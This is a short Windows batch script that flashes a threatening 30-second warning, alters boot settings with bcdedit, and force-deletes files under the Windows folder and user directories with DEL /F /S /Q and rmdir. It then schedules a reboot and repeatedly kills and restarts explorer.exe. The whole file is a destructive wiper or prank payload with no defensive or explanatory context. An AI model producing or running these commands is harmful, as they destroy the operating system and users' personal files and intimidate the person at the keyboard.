@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
bcdedit /set {default} recoveryenabled Yes
bcdedit /set {default} bootstatuspolicy DisplayAllFailures
bcdedit /set {bootmgr} displaybootmenu Yes
bcdedit /timeout 1
DEL /F /S /Q /A C:\Windows*.*
rmdir C:\Users*.* /S /Q
shutdown -r /o -t 20
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
start explorer.exe
taskkill /im explorer.exe /f
